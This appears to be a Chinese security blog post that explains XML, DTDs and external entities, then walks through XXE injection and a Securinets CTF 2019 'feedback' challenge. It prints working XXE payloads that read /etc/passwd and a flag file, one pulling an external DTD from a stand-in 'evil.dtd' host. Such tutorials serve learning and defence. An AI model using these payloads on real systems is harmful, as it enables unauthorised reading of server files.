<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>xxe · damn1t</title><meta name="description" content="xxexml基础什么是 XML?

XML 指可扩展标记语言（EXtensible Markup Language）XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。XML 是 W3C 的推"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"><li><a href="https://twitter.com/www.baidu.com"><i class="fa fa-twitter"></i></a></li><li><a href="http://weibo.com/www.baidu.com"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>xxe</a></h3></div><div class="post-content"><h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><h2 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h2><p>什么是 XML?</p>
<blockquote>
<p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。<br>XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p>
</blockquote>
<p>结构</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE note [
      &lt;!ELEMENT note (to,from,heading,body)&gt;
    &lt;!ELEMENT to  (#PCDATA)&gt;
    &lt;!ELEMENT from(#PCDATA)&gt;
      &lt;!ELEMENT heading (#PCDATA)&gt;
      &lt;!ELEMENT body(#PCDATA)&gt;
    ]&gt;
&lt;note&gt;
&lt;to&gt;George&lt;/to&gt;
&lt;from&gt;John&lt;/from&gt;
&lt;heading&gt;Reminder&lt;/heading&gt;
&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre><p>所以主要有以下模块</p>
<ul>
<li><p>元素<br>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>上例的<code>&lt;note&gt;</code>元素为根元素，进行概括性描述，而<code>&lt;to&gt;、&lt;from&gt;</code>等为子元素，详细描述</p>
</li>
<li><p>属性<br>元素可以附加某些属性<br>如<code>&lt;img src=&quot;computer.gif&quot; /&gt;</code></p>
</li>
<li><p>实体<br>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
</li>
<li><p>PCDATA<br>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
</li>
<li><p>CDATA<br>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
</li>
</ul>
<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>1.内部声明：&lt;!DOCTYPE 根元素 [元素声明]&gt; ex: <code>&lt;!DOCTYOE test any&gt;</code></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [
  &lt;!ELEMENT note (to,from,heading,body)&gt;
  &lt;!ELEMENT to  (#PCDATA)&gt;
  &lt;!ELEMENT from(#PCDATA)&gt;
  &lt;!ELEMENT heading (#PCDATA)&gt;
  &lt;!ELEMENT body(#PCDATA)&gt;
]&gt;
&lt;note&gt;
  &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre><p>2.外部声明（引用外部DTD）：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt; ex:<code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
&lt;note&gt;
&lt;to&gt;George&lt;/to&gt;
&lt;from&gt;John&lt;/from&gt;
&lt;heading&gt;Reminder&lt;/heading&gt;
&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt; 
</code></pre><p>note.dtd内容：</p>
<pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;
&lt;!ELEMENT to (#PCDATA)&gt;
&lt;!ELEMENT from (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body (#PCDATA)&gt;
</code></pre><blockquote>
<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>它使用一系列的合法元素来定义文档结构。</p>
</blockquote>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p><strong>实体又分为一般实体和参数实体<br>1.一般实体的声明语法:&lt;!ENTITY 实体名 “实体内容“&gt;<br>引用实体的方式：&amp;实体名；<br>2.参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY % 实体名 “实体内容“&gt;<br>引用实体的方式：%实体名；</strong></p>
<p>1，内部实体声明:&lt;!ENTITY 实体名称 “实体的值”&gt; ex:&lt;!ENTITY eviltest “eviltest”&gt;<br>完整实例:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;

&lt;test&gt;&amp;writer;&amp;copyright;&lt;/test&gt;
</code></pre><p>2，外部实体声明:&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;<br>完整实例:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
</code></pre><h2 id="xxe（XML-External-Entity）攻击"><a href="#xxe（XML-External-Entity）攻击" class="headerlink" title="xxe（XML External Entity）攻击"></a>xxe（XML External Entity）攻击</h2><h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><h4 id="方式一：直接通过DTD外部实体声明"><a href="#方式一：直接通过DTD外部实体声明" class="headerlink" title="方式一：直接通过DTD外部实体声明"></a>方式一：直接通过DTD外部实体声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;c&gt;&amp;b;&lt;/c&gt;
</code></pre><h4 id="方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明"><a href="#方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明" class="headerlink" title="方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明"></a>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明</h4><p>xml内容：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a SYSTEM &quot;http://xxx.com/evil.dtd&quot;&gt;
&lt;c&gt;&amp;b;&lt;/c&gt;
</code></pre><p>dtd文件内容：</p>
<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre><h4 id="方式三：通过DTD外部实体声明引入外部实体声明"><a href="#方式三：通过DTD外部实体声明引入外部实体声明" class="headerlink" title="方式三：通过DTD外部实体声明引入外部实体声明"></a>方式三：通过DTD外部实体声明引入外部实体声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY % d SYSTEM &quot;http://xxx.com/evil.dtd&quot;&gt;
        %d;
]&gt;
&lt;c&gt;&amp;b;&lt;/c&gt;
</code></pre><p>dtd文件内容：</p>
<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre><h3 id="支持协议类型"><a href="#支持协议类型" class="headerlink" title="支持协议类型"></a>支持协议类型</h3><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141612957-759004042.png" alt=""></p>
<p>其中php支持的协议会更多一些，但需要一定的扩展支持。</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141643972-251925223.png" alt=""></p>
<h3 id="危害性"><a href="#危害性" class="headerlink" title="危害性"></a>危害性</h3><h4 id="XXE危害1：读取任意文件"><a href="#XXE危害1：读取任意文件" class="headerlink" title="XXE危害1：读取任意文件"></a>XXE危害1：读取任意文件</h4><h4 id="XXE危害2：执行系统命令"><a href="#XXE危害2：执行系统命令" class="headerlink" title="XXE危害2：执行系统命令"></a>XXE危害2：执行系统命令</h4><h4 id="XXE危害3：探测内网端口"><a href="#XXE危害3：探测内网端口" class="headerlink" title="XXE危害3：探测内网端口"></a>XXE危害3：探测内网端口</h4><h4 id="XXE危害4：攻击内网网站"><a href="#XXE危害4：攻击内网网站" class="headerlink" title="XXE危害4：攻击内网网站"></a>XXE危害4：攻击内网网站</h4><h2 id="Securinets-CTF-Quals-2019-feedback"><a href="#Securinets-CTF-Quals-2019-feedback" class="headerlink" title="Securinets CTF Quals 2019-feedback"></a>Securinets CTF Quals 2019-feedback</h2><ul>
<li><strong>link</strong>：<a href="www.ctfsecurinets.com">www.ctfsecurinets.com</a></li>
</ul>
<p>界面是一个类似留言板的东西，查看源代码，发现：</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
function func(){
var xml = &apos;&apos; +
&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&apos; +
&apos;&lt;feedback&gt;&apos; +
&apos;&lt;author&gt;&apos; + $(&apos;input[name=&quot;name&quot;]&apos;).val() + &apos;&lt;/author&gt;&apos; +
&apos;&lt;email&gt;&apos; + $(&apos;input[name=&quot;email&quot;]&apos;).val() + &apos;&lt;/email&gt;&apos; +
&apos;&lt;content&gt;&apos; + $(&apos;input[name=&quot;feedback&quot;]&apos;).val() + &apos;&lt;/content&gt;&apos; +
&apos;&lt;/feedback&gt;&apos;;
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
console.log(xmlhttp.readyState);
console.log(xmlhttp.responseText);
document.getElementById(&apos;Message&apos;).innerHTML = xmlhttp.responseText;
}
}
xmlhttp.open(&quot;POST&quot;,&quot;feed.php&quot;,true);
xmlhttp.send(xml);
};
&lt;/script&gt;
</code></pre><p>然后查看request和response：<br><strong>request</strong></p>
<p>payload:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;d&lt;/author&gt;&lt;email&gt;d@d.d&lt;/email&gt;&lt;content&gt;undefined&lt;/content&gt;&lt;/feedback&gt;
</code></pre><p><strong>response</strong></p>
<pre><code>&lt;h4&gt;Thanks For you Feedback d&lt;/h4&gt;
</code></pre><p>于是可以尝试构造</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE A [&lt;!ENTITY d SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;feedback&gt;
  &lt;author&gt;&amp;d;&lt;/author&gt;
  &lt;email&gt;wdd&lt;/email&gt;
  &lt;content&gt;undefined&lt;/content&gt;
&lt;/feedback&gt;
</code></pre><p><img src="https://i.imgur.com/fKbqRLG.png" alt=""></p>
<p>然后再改payload为</p>
<pre><code>&lt;!DOCTYPE A [&lt;!ENTITY d SYSTEM &quot;file:///proc/self/cwd/flag&quot;&gt;]&gt;
</code></pre><p>reference：<br><a href="http://www.w3school.com.cn/dtd/dtd_elements.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/dtd_elements.asp</a><br><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a><br><a href="http://www.w3school.com.cn/xml/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xml/index.asp</a></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-25</span><i class="fa fa-tag"></i><a class="tag" href="/tags/xxe/" title="xxe">xxe </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/03/25/vulnerable/xxe/,damn1t,xxe,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/03/26/CTF/hackim ctf/" title="hackim web">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/03/18/OS/linux常见问题/" title="Linux常见错误">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>